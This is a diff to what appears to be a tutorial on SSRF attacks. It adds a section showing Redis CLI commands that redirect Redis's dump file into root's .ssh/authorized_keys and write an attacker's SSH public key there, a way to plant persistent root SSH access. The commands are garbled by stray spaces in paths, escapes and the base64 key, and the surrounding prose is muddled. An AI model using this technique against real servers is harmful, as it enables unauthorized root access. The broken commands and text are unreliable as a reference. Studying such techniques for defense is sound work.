@@ -170,3 +170,13 @@ The response can see a return of 404, which proves that the port is open:
 ![Capture](https://user-images.githubusercontent.com/25066959/70384558-2fe67f80-194e-11ea-86ef-67139c68a095.PNG)
 Then you can view the open port services based on the traversal, and decide whether to perform an internal network attack based on the open services. In practice, most of the SSRFs used are detection types, because they can be used with the same situation, and they can also be viewed or rebounded. The probability is worth discussing.    
 
+### Write keys
+```
+127.0.0.1:6379> config set dir / root /. Ssh
+OK
+127.0.0.1:6379> config set dbfilename authorized_keys
+OK
+127.0.0.1:6379> set 1 "\ n \ nssh-rsa AAAAB3NzaC1yc2EAAAABIwAAAQEAsJ4pbjXL5KnnX / FP6sZORaT3N8 / A6SEYv23VfrIVoPdOCBVD98O + RExVWCe8Iknwzx3w1Hm2uWnB6i6AtCnIji3yz16HIPryzoLE65xN4Z2vGXZk2YmOuRtqFPKPk / QCdf1Vxh6lwLZRo2msYEK / + mziOrmYy1UzwqLxfl1uNYVYTs2jHGBEikPwA7FAt5ZVRRBhzDnn8dyT201FOwR / fpukiXbaevZU2 / iyW + Qu9ssaZMJMpRzautNuZLxCmV9TfuP0NbsgCBHj1nOMf3BUQNXUtE4aCRP0gHbs18Wvpx5ryWyl / NWWQADOY2dMHMWuTtCxLSrfY / q + H8l + JGdQpw == \ n \ n"
+OK
+127.0.0.1:6379> save
+```
